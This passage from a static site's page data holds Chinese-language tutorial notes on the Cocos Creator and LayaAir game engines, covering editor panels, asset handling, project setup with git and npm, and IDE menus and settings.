prefab 自动同步模式”：新建 prefab 时，是否自动开启 prefab 资源上的「自动同步」选项。开启自动同步后，保存 prefab 资源修改时会自动同步场景中所有该 prefab 的实例。\n\n\n# 项目设置\n\n    项目设置 是打开的这个项目的设置，最后会保存到settings/project.json里。包含有“分组管理”、“模块设置”、“项目预览”、“自定义引擎”、“服务”。\n",normalizedContent:"# 熟悉编辑器\n\n\n# 基本界面\n\n    cocoscreator编辑器主要由 资源管理器、场景编辑器、层级管理器、属性检查器、控件库、动画编辑器、控制台 等组成。\n\n    项目打开时，默认的界面布局如下图\n\n\n    可以对这些面板进行移动、组合，以适应不同项目和开发者的需要。比如在边界处控制某个组件的大小，鼠标长按组件的名称标签可以拖动它去别的地方等等。如果你想将已改变的界面恢复，可以点击上方的 “布局”-“恢复默认布局”，当然你也可以选择 “经典布局” 和 “竖屏游戏布局”。\n\n\n# 资源管理器\n\n    资源管理器 显示了项目资源文件夹（assets）中所有资源（图片、动画、声音等），在编辑中会自动同步在操作系统中对项目资源文件夹的修改。\n\n    资源列表：展示用的常见的树结构，也是代码编辑器（文件列表）常用的，所以 资源列表的一些基本功能类似于操作文件列表（删除、复制、粘贴、拖拽、重命名等）。文件夹形式的资源可以展开/折叠；非文件夹形式的就是资源文件了，会隐藏扩展名但会用图标显示，在下方还会显示资源路径。\n    导入资源：可以直接将资源文件拖入资源管理器中，也可以选择“文件”-“资源导入...”。如果是创建新资源，可以使用左上角的“+”号。\n    搜索资源：在搜索框里输入资源名称，再点击搜索按钮。当然也可以选择你要搜索的类型。     .meta文件：在这个链接里有很详细的介绍，这里不展开了。\n\n\n# 场景编辑器\n\n    场景编辑器 是内容创作的核心工作区域，可以将资源或ui组件拖入场景编辑中，对它们进行摆放来搭建一个游戏的具体场景。\n\n\n    视图移动和定位：可以通过鼠标右键的拖拽来移动，鼠标滚轮是控制视图缩放的并且是以鼠标悬停的地方为参考点。\n\n    坐标系和网格：视图中有网格，用来表示世界坐标系中各个点的位置信息，单位是像素；左下角是(0, 0)点。\n\n    设计分辨率指示框：紫色线框里的是默认显示区域，这块区域是由设计分辨率决定的。\n\n    节点的选取：鼠标悬停到某个组件节点上，会出现灰色框（位置、大小）；单击它会出现蓝色框，并且可以进行变换。多选的话，可以用鼠标左键拉一个矩形出来，矩形里的就是你多选中的节点，还可以按住ctrl再去选节点，这样也是多选。当然你也可以通过层级管理器来选中它们（双击或按住ctrl再单击）。\n\n    控制手柄：场景编辑器中在特定编辑状态下显示出的可用鼠标进行交互操作的控制器。这些控制器只用来辅助编辑，不会在游戏运行时显示。\n\n    变换工具：\n        1.移动变换工具（快捷键w）：会出现红绿两个箭头和蓝色方块组成的移动控制手柄，可以沿着箭头方向移动，也可以用鼠标拖拽蓝色方块进行移动。\n        2.旋转变换工具（快捷键e）：会出现一个箭头和一个圆环组成的旋转控制手柄，可以拖拽箭头或圆环内任意一点就可以旋转节点。\n        3.缩放变换工具（快捷键r）：会出现红绿黄三个方块组成的缩放控制手柄，拖动红色是横向缩放、拖动绿色是纵向缩放、拖动黄色是按比例缩放。\n        4.矩形变换工具（快捷键t）：会出现一个矩形手柄，可以对矩形的边和顶点进行拖拽，以改变节点的大小和位置。\n\n\n# 层级管理器\n\n    场景编辑 中打开的场景会在 层级管理器 中展示它的所有节点，可以在层级管理器里创建、删除、修改（层级或顺序）节点，其他功能同资源管理器一样（复制粘贴重命名等）。\n\n    创建节点：可以使用左上角的“+”号或者鼠标右键的“创建节点”，可以创建不同类型的节点，如果你想用一个资源来创建节点，就直接从 资源管理器 中将资源拖拽进 层级管理器 中。\n\n    删除节点：先选中一个节点，然后按下“delete”或者“ctrl+backspace”，鼠标右键也可以。\n\n    层级或顺序修改：使用鼠标拖拽。\n\n    锁定节点：鼠标悬停在某个节点上，左侧会出现一把小锁，点击它就会让节点锁定然后不能被选中。\n\n\n# 属性检查器\n\n    属性检查器 是用来查看并编辑节点或资源的属性的，也就是说 场景编辑器 或 层级管理器 中选中的节点会在属性检查器中显示该节点的大小、位置、缩放、旋转等， 资源管理器 中选中的资源会在属性检查器中显示资源的类型、寻址模式、过滤模式等。\n\n    激活开关：属性检查器顶部是节点名称，旁边就是激活开关。隐藏or显示当前节点（包括子节点），可以理解为visible。\n\n    节点属性：node便签下就是一些属性了，悬停到这些属性上会有提示信息。node标签右侧有个设置按钮，可以重置node标签下的属性、复制这些属性、粘贴别处的属性。\n\n    组件属性：节点属性下面，会列出节点上挂载的所有组件和组件的属性。也有名称、激活开关、设置、一些属性，它额外有一个“帮助文档”，点击它可以直接跳到当前组件的帮助文档链接。\n\n    编辑属性：属性是组件脚本中声明的公开并可被序列化存储在场景和动画数据中的变量，在属性检查器中可以编辑它们的值，它们值的类型分为：\n        值类型属性：数字、字符串、布尔值、向量、枚举等简单的占用很少内存的变量类型。\n        引用类型属性：是比较复杂的对象，例如节点、组件、资源、脚本等，这种需要将其拖拽到属性栏中来完成引用类型属性的赋值。\n\n    多批量设置属性：在 资源管理器 中选中多个资源，然后 属性检查器 中会显示出选中的资源数量以及可编辑的资源属性。节点的多批量设置属性也是类似。\n\n\n# 控件库\n\n    控件库 是一个可视化控件仓库，包含内置控件、自定义控件、云组件，可以将你需要的控件拖拽到层级管理器或资源管理器中。\n\n    内置控件：是编辑器内置的预设节点，有默认资源的精灵（sprite）、包含背景图和文字标题的按钮（button）以及已经配置好内容和滚动条的滚动视图（scrollview）等。\n\n    自定义控件：用户自己制作的预制资源（prefab），再将这些预制资源从 资源管理器 中拖拽到“自定义控件”这个标签下，以完成自己定义的控件，然后就可以像内置控件一样在一些场景中反复使用。\n\n\n# 动画编辑器\n\n    动画编辑器 是用来编辑节点下的animation组件的。\n\n    常用按钮：左上角有一排常用的按钮，分别是“打开/关闭编辑模式”、“跳到第一帧”、“跳到上一帧”、“播放动画”、“跳到下一帧”、“插入帧事件”、“新增clips”。\n\n    时间轴和关键帧：左侧上方带有刻度的这部分是动画的时间轴，上面也会显示一些自定义事件（关键帧）。时间轴旁边还有一个“01-07”的字样，意思是当前处在1秒第7帧。\n        同一刻度不同帧率：当帧率为30时，“01-07”表示动画开始后的第1 + 7/30 = 1.2333 秒；当帧率为10时，“01-07”表示动画开始后的第1 + 7/10 = 1.7秒。\n        事件所处的关键帧，它的的总帧数不受帧率改变而影响。例如当前帧率30，向“01-07”刻度上添加了关键帧，该关键帧位于动画开始后总第37帧。之后把帧率修改为10，该关键帧仍然处在动画开始后第37帧（总帧数37不变），而此时关键帧所在位置的刻度读数为“03-07”。\n\n    其他：“属性列表”上方是层级管理（节点树）和节点内关键帧的预览区域，下方则是属性和关键帧信息。\n\n    快捷键：\n\n * left：向前移动一帧，如果已经在第 0 帧，则忽略当前操作\n * right：向后移动一帧\n * delete：删除当前所选中的关键帧\n * k：正向的播放动画，抬起后停止\n * j：反向播放动画，抬起后停止\n * ctrl / cmd + left：跳转到第 0 帧\n * ctrl / cmd + right：跳转到有效的最后一帧\n\n\n# 控制台\n\n    控制台 会显示报错、警告、编辑器或引擎生成的日志信息。\n\n    日志等级：\n\n * 日志(log)：灰色文字，通常用来显示正在进行的操作。\n * 提示(info)：蓝色文字，用来显示重要提示信息。\n * 成功(success)：绿色文字，表示当前执行的操作已成功完成。\n * 警告(warn)：黄色文字，用来提示用户最好进行处理的异常情况，但不处理也不会影响运行。\n * 报错(error)：红色文字，表示出现了严重错误，必须解决才能进行下一步操作或运行游戏。\n\n    设置以及功能：\n        1.合并：相同重复信息会被合并成一条，旁边会有黄色信息提示有多少条被合并了。\n        2.清空：左上角有一个清空按钮，如果要每次运行前清空可以到“设置”里设置。         3.日志过滤：可是按照日志等级来过滤，也可以输入关键字来过滤，还提供了正则表达式来过滤。\n\n\n# 主菜单\n\n    主菜单 包含有“文件”、“编辑”、“节点”、“组件”、“项目”、“面板”、“布局”、“扩展”、“开发者”和“帮助”。可以直接打开编辑器一一查看，都是字面上的意思，不再展开说明\n\n\n\n# 工具栏\n\n    工具栏 包含有“变换工具”、“预览工具”、“预览地址（二维码）”、“快捷打开项目文件夹”。\n\n    之前已经提过“变换工具”了，“预览工具”和“预览地址”也好理解，就是以模拟器还是浏览器去预览运行游戏，预览地址可以还是二维码用手机也可以预览。剩下的就是项目地址快捷打开、编辑器安装地址快捷打开。\n\n\n# 编辑器设置\n\n    编辑器设置 包含有“常规”、“数据编辑”、“原生开发环境”、“预览运行”。\n\n    需要注意的几点：\n\n * “构建日志是否在控制台显示”：这一项在选中状态时，构建发布原生项目的过程日志会直接显示在控制台面板里。非选中状态时，构建发布原生项目的日志会保存在 %user/.cocoscreator/logs/native.log\n * “meta 文件备份时显示确认”：在 meta 文件所属的资源丢失时，是否弹出对话框提示备份或删除 meta 文件。如果选择备份，可以在稍后手动恢复资源，并将 meta 文件手动拷贝回项目 assets 目录，防止资源相关的重要设置（如场景、prefab）丢失\n * “默认开启 prefab 自动同步模式”：新建 prefab 时，是否自动开启 prefab 资源上的「自动同步」选项。开启自动同步后，保存 prefab 资源修改时会自动同步场景中所有该 prefab 的实例。\n\n\n# 项目设置\n\n    项目设置 是打开的这个项目的设置，最后会保存到settings/project.json里。包含有“分组管理”、“模块设置”、“项目预览”、“自定义引擎”、“服务”。\n",charsets:{cjk:!0}},{title:"资源工作流",frontmatter:{},regularPath:"/book-web/CocosCreator%E6%B8%B8%E6%88%8F%E5%BC%95%E6%93%8E/2.%E8%B5%84%E6%BA%90%E5%B7%A5%E4%BD%9C%E6%B5%81.html",relativePath:"book-web/CocosCreator游戏引擎/2.资源工作流.md",key:"v-14900d75",path:"/book-web/CocosCreator%E6%B8%B8%E6%88%8F%E5%BC%95%E6%93%8E/2.%E8%B5%84%E6%BA%90%E5%B7%A5%E4%BD%9C%E6%B5%81.html",headers:[{level:2,title:"官方讲解",slug:"官方讲解",normalizedTitle:"官方讲解",charIndex:12},{level:2,title:"资源操作",slug:"资源操作",normalizedTitle:"资源操作",charIndex:38},{level:2,title:"贴图资源",slug:"贴图资源",normalizedTitle:"贴图资源",charIndex:212}],lastUpdated:"7/6/2022, 3:41:21 PM",lastUpdatedTimestamp:1657093281e3,headersStr:"官方讲解 资源操作 贴图资源",content:"# 资源工作流\n\n\n# 官方讲解\n\n    “资源工作流”官方讲解\n\n\n# 资源操作\n\n\n\n * 资源管理器 显示了项目资源文件夹（assets）中所有资源，这些资源无外乎是图片、动画、声音等，这些资源都由美术提供。\n * 资源管理器的展示 跟操作系统里的文件展示很像，有类似的 删除、复制、粘贴、拖拽、重命名、搜索 等功能。\n * .meta文件 有很详细的介绍，最好在编辑器里修改（添加、移动、删除）资源文件。\n\n\n# 贴图资源\n\n    贴图也叫作图像、图片，常见的格式有 JPG、PNG 等，在导入后会显示缩略图和一些属性。\n\n * Premultiply Alpha：该属性代表是否开启“透明度预乘”，开启后可以提高颜色混合的计算效率，还可以得到较好的缩放插值结果；但在一些情况下可能会导致图片显示时透明度的问题。Premultiply Alpha官方讲述\n * Wrap Mode：寻址模式或循环模式，是指贴图的渲染方式，采用[0,1]的延伸还是循环[0,1]里的内容。\n * Filter Mode：图片原始大小与屏幕上图像展示尺寸不一致时的过滤方式，Point（邻近点采样）、Bilinear（双线性过滤）、Trilinear（三线性过滤）三种过滤方式；前引擎版本中三线性过滤与双线性过滤效果一致，所以目前都是默认使用双线性过滤。Filter Mode官方讲述",normalizedContent:"# 资源工作流\n\n\n# 官方讲解\n\n    “资源工作流”官方讲解\n\n\n# 资源操作\n\n\n\n * 资源管理器 显示了项目资源文件夹（assets）中所有资源，这些资源无外乎是图片、动画、声音等，这些资源都由美术提供。\n * 资源管理器的展示 跟操作系统里的文件展示很像，有类似的 删除、复制、粘贴、拖拽、重命名、搜索 等功能。\n * .meta文件 有很详细的介绍，最好在编辑器里修改（添加、移动、删除）资源文件。\n\n\n# 贴图资源\n\n    贴图也叫作图像、图片，常见的格式有 jpg、png 等，在导入后会显示缩略图和一些属性。\n\n * premultiply alpha：该属性代表是否开启“透明度预乘”，开启后可以提高颜色混合的计算效率，还可以得到较好的缩放插值结果；但在一些情况下可能会导致图片显示时透明度的问题。premultiply alpha官方讲述\n * wrap mode：寻址模式或循环模式，是指贴图的渲染方式，采用[0,1]的延伸还是循环[0,1]里的内容。\n * filter mode：图片原始大小与屏幕上图像展示尺寸不一致时的过滤方式，point（邻近点采样）、bilinear（双线性过滤）、trilinear（三线性过滤）三种过滤方式；前引擎版本中三线性过滤与双线性过滤效果一致，所以目前都是默认使用双线性过滤。filter mode官方讲述",charsets:{cjk:!0}},{title:"CocosCreator游戏开发",frontmatter:{},regularPath:"/book-web/CocosCreator%E6%B8%B8%E6%88%8F%E5%BC%95%E6%93%8E/CocosCreator%E6%B8%B8%E6%88%8F%E5%BC%80%E5%8F%91.html",relativePath:"book-web/CocosCreator游戏引擎/CocosCreator游戏开发.md",key:"v-19e944ef",path:"/book-web/CocosCreator%E6%B8%B8%E6%88%8F%E5%BC%95%E6%93%8E/CocosCreator%E6%B8%B8%E6%88%8F%E5%BC%80%E5%8F%91.html",headers:[{level:2,title:"介绍",slug:"介绍",normalizedTitle:"介绍",charIndex:23},{level:2,title:"学习资料",slug:"学习资料",normalizedTitle:"学习资料",charIndex:272},{level:2,title:"说明",slug:"说明",normalizedTitle:"说明",charIndex:351}],lastUpdated:"7/6/2022, 3:41:21 PM",lastUpdatedTimestamp:1657093281e3,headersStr:"介绍 学习资料 说明",content:"# CocosCreator游戏开发\n\n\n# 介绍\n\n    2016年，引擎团队发布了一款新产品Cocos Creator。它包含游戏引擎、资源管理、场景编辑、UI设计、调试、游戏预览和发布等游戏开发所需的全套功能，还包含一些游戏开发常用的工具链。工作流如下：\n\n\n    CocosCreator完全实现了脚本化、组件化和数据驱动，极大提高了引擎的易用性。其组件化和数据驱动使用ECS（“实体-组件”）设计模式实现的，可以为场景中的节点（实体）按需挂载各种内置或自定义组件，然后通过“系统”来管理这些节点，以达到游戏的运行和交互。\n\n\n# 学习资料\n\n * Cocos Creator官方学习文档\n * Cocos Creator腾讯视频\n * 《Cocos Creator游戏开发实战》\n\n\n# 说明\n\n    Cocos官方学习文档讲得比较详细也比较全面，有经验的直接上手游戏开发，在开发过程中学习。把难点和易忘点记录下来，也可以记录下自己的心得体会等。",normalizedContent:"# cocoscreator游戏开发\n\n\n# 介绍\n\n    2016年，引擎团队发布了一款新产品cocos creator。它包含游戏引擎、资源管理、场景编辑、ui设计、调试、游戏预览和发布等游戏开发所需的全套功能，还包含一些游戏开发常用的工具链。工作流如下：\n\n\n    cocoscreator完全实现了脚本化、组件化和数据驱动，极大提高了引擎的易用性。其组件化和数据驱动使用ecs（“实体-组件”）设计模式实现的，可以为场景中的节点（实体）按需挂载各种内置或自定义组件，然后通过“系统”来管理这些节点，以达到游戏的运行和交互。\n\n\n# 学习资料\n\n * cocos creator官方学习文档\n * cocos creator腾讯视频\n * 《cocos creator游戏开发实战》\n\n\n# 说明\n\n    cocos官方学习文档讲得比较详细也比较全面，有经验的直接上手游戏开发，在开发过程中学习。把难点和易忘点记录下来，也可以记录下自己的心得体会等。",charsets:{cjk:!0}},{title:"1.环境搭建",frontmatter:{title:"1.环境搭建"},regularPath:"/book-web/LayaBox%E6%B8%B8%E6%88%8F%E5%BC%95%E6%93%8E/1.%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA.html",relativePath:"book-web/LayaBox游戏引擎/1.环境搭建.md",key:"v-7c2733f6",path:"/book-web/LayaBox%E6%B8%B8%E6%88%8F%E5%BC%95%E6%93%8E/1.%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA.html",headers:[{level:2,title:"LayaAir安装",slug:"layaair安装",normalizedTitle:"layaair安装",charIndex:11},{level:2,title:"代码管理(Git)、扩展包管理(npm)",slug:"代码管理-git-、扩展包管理-npm",normalizedTitle:"代码管理(git)、扩展包管理(npm)",charIndex:176},{level:2,title:"代码编辑器(VSCode)、TypeScript",slug:"代码编辑器-vscode-、typescript",normalizedTitle:"代码编辑器(vscode)、typescript",charIndex:522},{level:2,title:"代码测试(mocha、chai)",slug:"代码测试-mocha、chai",normalizedTitle:"代码测试(mocha、chai)",charIndex:725},{level:2,title:"项目结构",slug:"项目结构",normalizedTitle:"项目结构",charIndex:982}],lastUpdated:"7/6/2022, 3:41:21 PM",lastUpdatedTimestamp:1657093281e3,headersStr:"LayaAir安装 代码管理(Git)、扩展包管理(npm) 代码编辑器(VSCode)、TypeScript 代码测试(mocha、chai) 项目结构",content:"# 环境搭建\n\n\n# LayaAir安装\n\n 1. 先进入Laya引擎官网，再点击“引擎下载”选择“LayaAir IDE下载”，不要使用最新的版本，要选择晚一些的版本。\n 2. 更新引擎，可以直接下载引擎包，在本地替换，也可以打开IDE在IDE里面进行更新。\n 3. 打开LayaAir IDE，点击“新建”，选择TypeScript版本。\n\n\n# 代码管理(Git)、扩展包管理(npm)\n\n 1. 先下载安装Git 和Node.js。Git的使用可以查看之前写的——Git的使用，Npm的使用可以查看之前写的——Npm的使用。\n\n 2. 定位到之前新建项目的根目录下，在空白处右击并选择 “Git Bash Here”，在命令行窗口中输入 git init，为项目添加代码管理工具。当然，如果项目已经存在于线上git代码库了，直接使用 git clone xxx 命令克隆下来即可。\n\n 3. 命令行窗口不要关闭，继续输入 npm init ，为该项目添加npm管理工具，后面需要什么依赖再安装什么依赖。当然，你也可以先将 package.json 配置好（需要的依赖包），然后运行 npm install 将所有的依赖下载好。\n\n\n# 代码编辑器(VSCode)、TypeScript\n\n 1. LayaAir IDE一般只用来场景编辑和资源导出，所以得给项目专门配置一个代码编辑工具VSCode，VSCode的使用可以查看之前写的——VSCode的使用。\n\n 2. 使用 “npm install --save-dev typescript” 来安装TypeScript，配置好 tsconfig.json、tslint.json\n\n\n# 代码测试(mocha、chai)\n\n 1. 引擎里的元素在Node环境下可能跑不起来（没有Window），所以用单元测试测跟引擎元素无关的逻辑。这样只需要用到mocha+chai，而mochawesome、nyc两种报告其实没什么必要。\n\n 2. 关于mocha和chai的内容可以查看这篇——基于mocha+chai的单元测试。\n\n 3. 可以等引擎团队推出专门的测试框架（unity就有自己的测试框架）；自己写的话，要引一些包修改一些东西有些麻烦，平常使用mock数据来对自己的组件进行测试就可以了。\n\n\n# 项目结构\n\n    新建的Laya项目有如下结构：\n\nProjectName（项目文件夹）\n  ├──.laya （项目配置目录，存放的是项目在开发运行中的一些配置信息）\n  │   ├──compile.js （是gulp自定义编译流程的脚本文件，如果开发者对gulp比较熟悉的可以修改，否则不要动这里）\n  │   ├──launch.json （文件保存了项目调试的一些配置信息，分别是LayaAirIDE的调试配置和chrome浏览器调试配置）\n  │   └──publish.js （是gulp针对项目发布的脚本文件，开发者不要动这里）\n  ├──bin （项目输出目录，存放项目中输出的js 、HTML、游戏资源等项目运行文件，以及小游戏项目文件，运行和调试都是基于这个目录）\n  ├──laya （项目UI目录，存放LayaAirIDE当前的UI项目）\n  │   ├──assets （用来存放UI场景中所需的组件图片、音频文件等资源）\n  │   ├──pages （用来存放IDE中的场景、动画、预设等配置文件）\n  │   └──.laya （.laya文件是LayaAirIDE的UI项目配置文件）\n  ├──libs （项目库目录，代码提示，开发者假如有三方的类库使用，相关的.d.ts文件请放到这个目录下）\n  ├──release （项目发布目录，发布项目后才会生成对应的版本目录）\n  ├──src （项目的源代码目录）\n  │   ├──script （项目中的用到的源代码文件，开发者编写的游戏脚本）\n  │   ├──ui （ui目录是IDE自动生成的，开发者不要改动这里，改了也会被下次导出替换）\n  │   ├──GameConfig （游戏配置）\n  │   └──Main.ts （游戏入口文件）\n  ├──.gitignore （ git忽略设置：设置项目中一些无需提交到git的文件或文件夹。）\n  ├──ProjectName.laya （ProjectName这个项目的工程配置文件，记录了当前项目的项目名称、使用的类库版本号等）\n  └──tsconfig.json （typescript配置：用于配置项目的ts版本信息、基本规范等。）\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n\n\n需要注意的点：\n\n * 项目的入口是src/Main.ts，如果你不想使用它作为入口，可以去.laya/compile.js里修改。\n * bin目录里的东西有很多，libs是引擎库，prefab是导出的预设库，res是导出的资源库，还有声音库，H5游戏入口，小游戏所使用的文件等。",normalizedContent:"# 环境搭建\n\n\n# layaair安装\n\n 1. 先进入laya引擎官网，再点击“引擎下载”选择“layaair ide下载”，不要使用最新的版本，要选择晚一些的版本。\n 2. 更新引擎，可以直接下载引擎包，在本地替换，也可以打开ide在ide里面进行更新。\n 3. 打开layaair ide，点击“新建”，选择typescript版本。\n\n\n# 代码管理(git)、扩展包管理(npm)\n\n 1. 先下载安装git 和node.js。git的使用可以查看之前写的——git的使用，npm的使用可以查看之前写的——npm的使用。\n\n 2. 定位到之前新建项目的根目录下，在空白处右击并选择 “git bash here”，在命令行窗口中输入 git init，为项目添加代码管理工具。当然，如果项目已经存在于线上git代码库了，直接使用 git clone xxx 命令克隆下来即可。\n\n 3. 命令行窗口不要关闭，继续输入 npm init ，为该项目添加npm管理工具，后面需要什么依赖再安装什么依赖。当然，你也可以先将 package.json 配置好（需要的依赖包），然后运行 npm install 将所有的依赖下载好。\n\n\n# 代码编辑器(vscode)、typescript\n\n 1. layaair ide一般只用来场景编辑和资源导出，所以得给项目专门配置一个代码编辑工具vscode，vscode的使用可以查看之前写的——vscode的使用。\n\n 2. 使用 “npm install --save-dev typescript” 来安装typescript，配置好 tsconfig.json、tslint.json\n\n\n# 代码测试(mocha、chai)\n\n 1. 引擎里的元素在node环境下可能跑不起来（没有window），所以用单元测试测跟引擎元素无关的逻辑。这样只需要用到mocha+chai，而mochawesome、nyc两种报告其实没什么必要。\n\n 2. 关于mocha和chai的内容可以查看这篇——基于mocha+chai的单元测试。\n\n 3. 可以等引擎团队推出专门的测试框架（unity就有自己的测试框架）；自己写的话，要引一些包修改一些东西有些麻烦，平常使用mock数据来对自己的组件进行测试就可以了。\n\n\n# 项目结构\n\n    新建的laya项目有如下结构：\n\nprojectname（项目文件夹）\n  ├──.laya （项目配置目录，存放的是项目在开发运行中的一些配置信息）\n  │   ├──compile.js （是gulp自定义编译流程的脚本文件，如果开发者对gulp比较熟悉的可以修改，否则不要动这里）\n  │   ├──launch.json （文件保存了项目调试的一些配置信息，分别是layaairide的调试配置和chrome浏览器调试配置）\n  │   └──publish.js （是gulp针对项目发布的脚本文件，开发者不要动这里）\n  ├──bin （项目输出目录，存放项目中输出的js 、html、游戏资源等项目运行文件，以及小游戏项目文件，运行和调试都是基于这个目录）\n  ├──laya （项目ui目录，存放layaairide当前的ui项目）\n  │   ├──assets （用来存放ui场景中所需的组件图片、音频文件等资源）\n  │   ├──pages （用来存放ide中的场景、动画、预设等配置文件）\n  │   └──.laya （.laya文件是layaairide的ui项目配置文件）\n  ├──libs （项目库目录，代码提示，开发者假如有三方的类库使用，相关的.d.ts文件请放到这个目录下）\n  ├──release （项目发布目录，发布项目后才会生成对应的版本目录）\n  ├──src （项目的源代码目录）\n  │   ├──script （项目中的用到的源代码文件，开发者编写的游戏脚本）\n  │   ├──ui （ui目录是ide自动生成的，开发者不要改动这里，改了也会被下次导出替换）\n  │   ├──gameconfig （游戏配置）\n  │   └──main.ts （游戏入口文件）\n  ├──.gitignore （ git忽略设置：设置项目中一些无需提交到git的文件或文件夹。）\n  ├──projectname.laya （projectname这个项目的工程配置文件，记录了当前项目的项目名称、使用的类库版本号等）\n  └──tsconfig.json （typescript配置：用于配置项目的ts版本信息、基本规范等。）\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n\n\n需要注意的点：\n\n * 项目的入口是src/main.ts，如果你不想使用它作为入口，可以去.laya/compile.js里修改。\n * bin目录里的东西有很多，libs是引擎库，prefab是导出的预设库，res是导出的资源库，还有声音库，h5游戏入口，小游戏所使用的文件等。",charsets:{cjk:!0}},{title:"2.IDE的使用",frontmatter:{title:"2.IDE的使用"},regularPath:"/book-web/LayaBox%E6%B8%B8%E6%88%8F%E5%BC%95%E6%93%8E/2.IDE%E7%9A%84%E4%BD%BF%E7%94%A8.html",relativePath:"book-web/LayaBox游戏引擎/2.IDE的使用.md",key:"v-0c36c16a",path:"/book-web/LayaBox%E6%B8%B8%E6%88%8F%E5%BC%95%E6%93%8E/2.IDE%E7%9A%84%E4%BD%BF%E7%94%A8.html",headers:[{level:2,title:"IDE的基本布局",slug:"ide的基本布局",normalizedTitle:"ide的基本布局",charIndex:13},{level:2,title:"菜单栏和导航栏",slug:"菜单栏和导航栏",normalizedTitle:"菜单栏和导航栏",charIndex:28},{level:2,title:"项目设置",slug:"项目设置",normalizedTitle:"项目设置",charIndex:515},{level:2,title:"帮助",slug:"帮助",normalizedTitle:"帮助",charIndex:272},{level:2,title:"编辑",slug:"编辑",normalizedTitle:"编辑",charIndex:254},{level:2,title:"工具",slug:"工具",normalizedTitle:"工具",charIndex:260},{level:2,title:"导出",slug:"导出",normalizedTitle:"导出",charIndex:263},{level:2,title:"IDE可视化编辑模式的操作",slug:"ide可视化编辑模式的操作",normalizedTitle:"ide可视化编辑模式的操作",charIndex:2173},{level:3,title:"创建场景并添加组件",slug:"创建场景并添加组件",normalizedTitle:"创建场景并添加组件",charIndex:2191},{level:3,title:"资源预览和场景层级",slug:"资源预览和场景层级",normalizedTitle:"资源预览和场景层级",charIndex:2396}],lastUpdated:"7/6/2022, 3:41:21 PM",lastUpdatedTimestamp:1657093281e3,headersStr:"IDE的基本布局 菜单栏和导航栏 项目设置 帮助 编辑 工具 导出 IDE可视化编辑模式的操作 创建场景并添加组件 资源预览和场景层级",content:"# IDE的使用\n\n\n# IDE的基本布局\n\n\n\n\n# 菜单栏和导航栏\n\n * 菜单栏：\n   * 新建项目：字面意思，新建一个新的项目\n   * 全部保存：字面意思，保存全部文件\n   * F8编译：在src中的脚本修改后，需要使用它进行编译\n   * F6运行和xx调试：在IDE里调试还是启用chrome调试\n   * 发布：发布微信、QQ、字节跳动等小游戏包\n   * 二维码：经常使用的调试方式，可以在浏览器上或者手机上调试，带IP的会非常方便\n * 导航栏\n   * LOGO：单击会出现“文件、编辑、视图、工具、导出、项目、插件、帮助”\n   * 主页：主要有“新建、打开、最近项目、新闻、学习”\n   * 编辑模式：也叫设计模式，主要是项目的UI设计、资源管理、属性管理等\n   * 问答社区：其实也就是http://ask.layabox.com/\n   * 文档搜索：其实也就是http://sou.layabox.com/\n   * 代码编辑器：以前IDE是将VSCode嵌在这里的，但由于VSCode更新后引擎方对新版本适配要做出大量工作，后面就将内置的VSCode移出了，直接外链了VSCode\n\n\n# 项目设置\n\n    项目设置在“LOGO-文件-项目设置F9”，点击后如下图所示\n\n\n * 预览设置\n   * 起始场景：也就是入口场景，一般都是设置的固定的入口场景，在test项目中是设置的当前场景\n   * 适配横竖屏对齐方式后面会单独说\n   * 设计宽高：这个是游戏画布的大小，与具体场景大小无关，可以试着改小一点看看效果\n   * 调试辅助工具：比较好用的调试面板，可以查看节点和层级信息，配合着chromeDevTool使用更佳\n   * 将场景文件导出为json：一般是scene这样的后缀，但小游戏不支持这样的文件，所以这里默认导出为json\n * 类库设置：项目有特殊功能可能需要额外勾选一些类库，去掉不使用的类库\n * 场景设置-发布模式\n   * 内嵌模式：以前没有小游戏的时候使用的是内嵌模式，将UI放到了js代码里会很方便，这样UI也不会重复被加载，但是js代码包体比较大；\n   * 加载模式：出现小游戏后需要考虑到js的大小了，所以将UI场景类都放到了一个json里，使用时加载这个大的json；\n   * 分离模式：将场景UI场景类都分开，使用哪个就加载哪个场景类，不会再加载那个大的json了，在laya2.0也有了优化会自动加载对应的场景类；\n   * 文件模式：是开发小游戏独有的，它不生成场景类能进一步减少包大小，但是需要Scene.load来加载使用，在调用场景里的变量需要getchild获取之后进行操作。推荐使用“分离模式”和“文件模式”，默认是“文件模式”。\n * 图集设置\n   * 一般不修改里面的设置，低于512的碎图打到一个图集里，图集的好处就是减少提交渲染批次以提高GPU运算，也减少了资源占用空间。\n * 编辑设置\n   * 容器列表：可以自定义容器，将自定义容器添加进来\n   * 场景类型：可以自定义场景类型，将自定义场景类型添加进来\n   * 语言包路径：设置成某个多语言包的路径，会在IDE里替换成对应语言的UI，但游戏中还是未替换只是用来预览的\n\n\n# 帮助\n\n * 开发人员工具：当IDE报错时，可以打开这个工具，将里面的信息保存上传到引擎官方进行反馈\n * 打开编辑器本地缓存：点击后会跳转到IDE的本地缓存，如果编辑器显示错乱了或者报错了，可以删除里面的缓存（前提是“视图-重置面板”不起作用）\n\n\n# 编辑\n\n * 定位资源：选中组件后使用这个功能可以查看它的资源在哪里\n * 原位粘贴：一般的粘贴都会偏移之前的位置，这个就在原位\n * 重复复制：适合于几行几列的复制\n\n\n# 工具\n\n * 启用编译优化功能：默认是关闭的，打开后，在“F8编译”时，如果代码没有改动过就不会再编译了；这个功能主要适用于只替换图片不修改代码的场景。\n * SWF转换：以前flash项目常使用的功能。\n * JS压缩：将xx.js压缩成xx.min.js\n * 龙骨动画转换：将龙骨动画转换成Laya可以识别的格式\n * Spine动画转换：将Spine动画转换成Laya可以识别的格式\n * Psd2UI：如果美术提供的PSD已经按照规定格式命名好了，使用该功能就可以直接分解成对应的资源\n * 图集打包：将很多图片打包成图集\n * 运行器下载：native打包使用的\n * app构建：将项目打包成app\n * 代码编辑器：之前提过的，外链到VSCode\n * 微信web开发者工具：外链微信web开发者工具\n\n\n# 导出\n\n每次运行时都会自动“导出”，如果运行的界面没有关，可以直接“导出”再刷新页面\n\n * 导出F12：只针对修改的UI进行导出，导出的是UI和资源等内容\n * 清理并导出Ctrl+F12：不管修改与否，将所有之前导出的内容都清理掉再导出所有\n * 导出代码：没有修改资源只导出代码\n * 发布：发布的时候用，平常不要点击，很慢\n * 